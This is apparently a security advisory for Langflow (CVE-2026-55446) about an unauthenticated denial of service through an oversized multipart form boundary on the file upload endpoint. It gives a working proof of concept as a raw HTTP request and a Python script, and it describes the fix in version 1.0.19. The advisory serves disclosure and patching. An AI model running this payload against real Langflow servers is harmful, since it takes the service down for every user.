aliases:
  - CVE-2026-55446
summary: "Langflow: Unauthenticated DoS through multipart form boundary file upload\n### Summary\n\
  An attacker can send a `/api/v1/files/upload/` request without any authentication token/cookies\
  \ and abuse a very long multipart form boundary to make the langflow app unusable for all\
  \ users for an indefinite amount of time. \n\n### Details\nhttps://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40\n\
  \nThe file upload function will try to process the multipart form data even if it is malformed\
  \ and contains a payload such as an extremely large amount of hyphens after the boundary.\
  \ It also does not do the authentication check before trying to process this data so an unauthenticated\
  \ attacker can perform this as well as authenticated users. \n\nAdditionally, an attacker\
  \ doesn't even need to know a valid UUID of a flow to send this request because the server\
  \ will still try to process the large boundary even with any random value in place of the\
  \ flow ID. \n\n### PoC\n\nAn attacker makes this request to upload a file without valid authentication\
  \ information or a valid flow ID: \n\n```\nPOST /api/v1/files/upload/test HTTP/1.1\nHost:\
  \ 127.0.0.1:7860\nContent-Length: 3000192\nAccept-Language: en-US,en;q=0.9\nUser-Agent: Mozilla/5.0\
  \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120\
  \ Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryorGBAKSkv5wR6WqJ\n\
  Accept: application/json, text/plain, */*\nOrigin: http://127.0.0.1:7860\nAccept-Encoding:\
  \ gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundaryorGBAKSkv5wR6WqJ\n\
  Content-Disposition: form-data; name=\"file\"; filename=\"dos.txt\"\nContent-Type: text/plain\n\
  \nDoS in progress!\n\n------WebKitFormBoundaryorGBAKSkv5wR6WqJ------------<insert a large\
  \ amount of hyphens such as 1,000,000>\n```\n\nHere is the request in python: \n\n```python\n\
  import requests\n\nurl = \"http://127.0.0.1:7860/api/v1/files/upload/test\"\n\nheaders = {\n\
  \    \"Content-Type\": \"multipart/form-data; boundary=---------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ\"\
  \n}\n\ndata = (\n    \"-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ\\r\\\
  n\"\n    \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"dos.txt\\\"\\r\\\
  n\"\n    \"Content-Type: text/plain\\r\\n\\r\\n\"\n    \"DoS in progress\\r\\n\"\n    \"-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ--\"\
  \ + '-' * 1000000 + \"\\r\\n\"\n)\n\nresponse = requests.post(url, headers=headers, data=data)\n\
  ```\n\nThe app will then be stuck in the \"server is busy\" state for all users:\n\n<img width=\"\
  733\" alt=\"image\" src=\"https://github.com/user-attachments/assets/227169d8-f1b7-4072-8c09-e416e4808d05\"\
  >\n\n### Impact\nSending this request will result in the server being unusable for all users\
  \ for an infinite amount of time because the request can be repeated as much as you want.\n\
  \n### Patches\nFixed in **1.0.19** via PR [#3923](https://github.com/langflow-ai/langflow/pull/3923).\
  \ A `check_boundary` HTTP middleware was added that validates the multipart boundary (`^[\\\
  w\\-]{1,70}$`) and rejects malformed requests — including the oversized-hyphen payload — with\
  \ `HTTP 422` **before** the body is parsed. The upload endpoint also gained an authentication\
  \ and flow-ownership check (`get_current_active_user` + `403` on mismatch), closing the unauthenticated\
  \ access vector. Upgrade to **1.0.19 or later**."
